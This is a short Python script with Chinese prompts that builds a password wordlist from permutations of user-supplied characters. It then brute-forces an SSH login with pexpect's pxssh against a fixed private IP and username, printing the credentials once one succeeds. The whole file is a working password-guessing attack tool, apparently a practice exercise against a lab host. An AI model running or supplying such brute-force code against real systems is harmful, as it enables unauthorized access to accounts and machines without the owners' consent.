from pexpect import pxssh
import itertools
def dic():
    str=input("请输入字典元素：")
    num=int(input("请输入复杂度："))
    temp=itertools.permutations(str,num)
    with open("./passwd.txt",'a',encoding='utf-8') as f:
        for i in temp:
            f.write(''.join(i))
            f.write(''.join('\n'))
def Login(server,username,password):
    try:
        s=pxssh.pxssh()
        s.login(server,username,password)
        print("------------登陆成功！！------------")
        print(username,password)
        return True
    except:print("登陆失败")
def main():
    dic()
    with open("./passwd.txt",'r') as f:
        for passwd in f:
            live=Login('192.168.59.129', 'yuzige', '{}'.format(passwd))
            if live==True:
                break
if __name__=="__main__":
    main()